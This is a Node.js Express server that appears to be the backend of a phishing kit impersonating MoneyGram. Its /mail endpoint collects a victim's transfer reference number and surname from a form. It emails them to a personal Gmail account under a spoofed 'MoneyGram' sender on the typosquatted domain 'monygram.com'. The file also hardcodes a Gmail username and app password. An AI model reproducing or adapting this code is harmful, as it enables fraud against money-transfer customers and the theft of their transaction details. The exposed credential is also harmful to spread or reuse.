const express = require('express');
const cors = require('cors');
const { join } = require('path');
const nodemailer = require('nodemailer');

const app = express();

app.set('PORT', process.env.PORT || 5000);
app.set('HOSTNAME', process.env.HOSTNAME || 'localhost');

app.use(cors());
app.use(express.json());
app.use(express.static(join(__dirname, 'public')));

app.post('/mail', async (req, res) =>
{
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'moayad224444@gmail.com',
      pass: 'uaohwuyqkzrfbqco',
    },
  });

  try {
    await transporter.sendMail({
      from: '"MoneyGram" <no-reply@monygram.com>',
      to: 'moayad224444@gmail.com',
      subject: 'MoneyGram: Track',
      text: `
      <h1>MoneyGram</h1> 
      <bdo dir="rtl"><strong>يعجرملا مقرلا ليوختلا مقر</strong>: ${req.body.in1}</bdo>
      <br />
      <bdo dir="rtl"><strong> كترهش </strong>: ${req.body.in2}</bdo>
      `,
      html: `
        <h1>MoneyGram</h1>
        <bdo dir="ltr"><strong>يعجرملا مقرلا ليوختلا مقر</strong>: ${req.body.in1}</bdo>
        <br />
        <bdo dir="ltr"><strong>كترهش</strong>: ${req.body.in2}</bdo>
        `,
    });

    res.send('ok');
  } catch (error) {
    console.log('error', error);
    res.status(500).json(error);
  }
});

app.listen(app.get('PORT'), () =>
{
  console.log(
    `the server is running on: http://${app.get('HOSTNAME')}:${app.get(
      'PORT',
    )}`,
  );
});
